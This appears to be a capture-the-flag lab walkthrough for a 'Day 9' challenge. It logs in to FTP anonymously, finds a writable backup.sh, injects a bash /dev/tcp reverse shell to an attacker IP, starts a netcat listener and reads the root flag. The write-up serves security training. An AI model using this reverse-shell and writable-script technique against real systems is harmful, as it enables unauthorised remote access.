
# Day9

## Anyone can be Santa!

Deploy the machine and go through the given information. And, let’s move on to the questions!

First, just ***FTP*** into the machine: `ftp <machine_ip>`

**Make sure to have username: anonymous**

Now, if we ***ls*** to see what directories are available over there, only 1 has data. And we can also access it as anonymous. 

![46](https://user-images.githubusercontent.com/83836972/122225194-7bc69d00-ced2-11eb-915d-730ff4c2548e.PNG)

And there you get the answer to the first question.

Next, we use ***cd*** to change into it, then ***ls*** again to see the content.

![47](https://user-images.githubusercontent.com/83836972/122225217-7ff2ba80-ced2-11eb-9571-811d3659968b.PNG)

And boom, here is the answer to question 2.

There are two files and we can download them using `get <filename>`. 


Now, if you open the ***shoppinglist.txt*** in nano using `nano shoppinglist.txt`, you'll see a movie name in the editor, which is none other than the answer of our question number 3.

![48](https://user-images.githubusercontent.com/83836972/122225246-85500500-ced2-11eb-941d-11db95c21ff9.PNG)

And if you open, ***backup.sh*** in nano using the same command you used before, you'll see that it is a ***Backup script that absolutely should not be in the public folder. We even have permissions to upload in that folder.***

Also, if you've gone through the dossier carefully, you know which command to execute here! But what else are we here for if not to help you!

We'll add `bash -i >& /dev/tcp/10.17.5.246/4444 0>&1`
here:

![49](https://user-images.githubusercontent.com/83836972/122225274-8b45e600-ced2-11eb-8a32-f4605f479e02.PNG)

Before we upload the modified script, we need to set up a listener for our reverse shell. 

`nc -lvnp 4444`

Now we can upload the scrip with `put backup.sh`  

**Remember to put this up in ftp only.**

![50](https://user-images.githubusercontent.com/83836972/122225296-900a9a00-ced2-11eb-9832-0b38033c0e02.PNG)

After a minute or two, we should get a connection on our listener.

And then, with `cat /root/flag.txt` we read our final flag.

![51](https://user-images.githubusercontent.com/83836972/122225325-96991180-ced2-11eb-9326-c708c1b26ae8.PNG)

Submit your answers and don't forget to maintain your streak!
